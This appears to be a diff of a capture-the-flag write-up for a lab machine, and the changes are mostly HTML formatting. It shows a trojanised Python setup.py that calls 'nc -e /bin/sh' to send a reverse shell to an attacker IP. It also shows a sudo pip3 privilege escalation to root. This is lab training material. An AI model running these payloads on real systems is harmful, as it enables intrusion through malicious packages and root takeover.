+        &quot;Operating System :: OS Independent&quot;,
     ],
-    python_requires=&#39;&gt;=3.6&#39;,
+    python_requires='&gt;=3.6',
 )
-</code></pre></div><p>I started a <code>nc</code> listener but I got a reverse shell by my own local machine? Well I could have added checks to disable that and only get a shell as user not named <code>kali</code>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">[...]
+</code></pre><p>I started a <code>nc</code> listener but I got a reverse shell by my own local machine? Well I could have added checks to disable that and only get a shell as user not named <code>kali</code>.</p>
+<pre><code>[...]
 import getpass
 username = getpass.getuser()
-if username != &#39;kali&#39;:
-    ip1 = os.system(&#39;nc -e /bin/sh 10.10.16.3 9998&#39;)
+if username != 'kali':
+    ip1 = os.system('nc -e /bin/sh 10.10.16.3 9998')
 [...]
-</code></pre></div><p>Now when I executed the upload I got as shell as <code>low</code> and flag <code>user.txt</code>.</p>
+</code></pre><p>Now when I executed the upload I got as shell as <code>low</code> and flag <code>user.txt</code>.</p>
 <h2 id="privesc-to-root">PrivEsc to root<a class="anchor" href="#privesc-to-root">#</a></h2>
 <p>I transfered <code>linenum.sh</code> and ran it. I saw that user <code>low</code> can execute <code>pip3</code> with sudo permissions.</p>
 <h3 id="exploiting-pip3">Exploiting pip3<a class="anchor" href="#exploiting-pip3">#</a></h3>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">[+] We can sudo without supplying a password!
+<pre><code>[+] We can sudo without supplying a password!
 Matching Defaults entries for low on sneakymailer:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
 
 User low may run the following commands on sneakymailer:
     (root) NOPASSWD: /usr/bin/pip3
-</code></pre></div><p>I went on GTFOBins and found a shell for that.</p>
+</code></pre><p>I went on GTFOBins and found a shell for that.</p>
 <p>I simply ran this and got root.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ TF=$(mktemp -d)
-$ echo &#34;import os; os.execl(&#39;/bin/sh&#39;, &#39;sh&#39;, &#39;-c&#39;, &#39;sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&#39;)&#34; &gt; $TF/setup.py
+<pre><code>$ TF=$(mktemp -d)
+$ echo &quot;import os; os.execl('/bin/sh', 'sh', '-c', 'sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)')&quot; &gt; $TF/setup.py
 $ sudo /usr/bin/pip3 install $TF
-</code></pre></div><p>Now I got shell as <code>root</code> and <code>root.txt</code></p>
+</code></pre><p>Now I got shell as <code>root</code> and <code>root.txt</code></p>
 
 
 
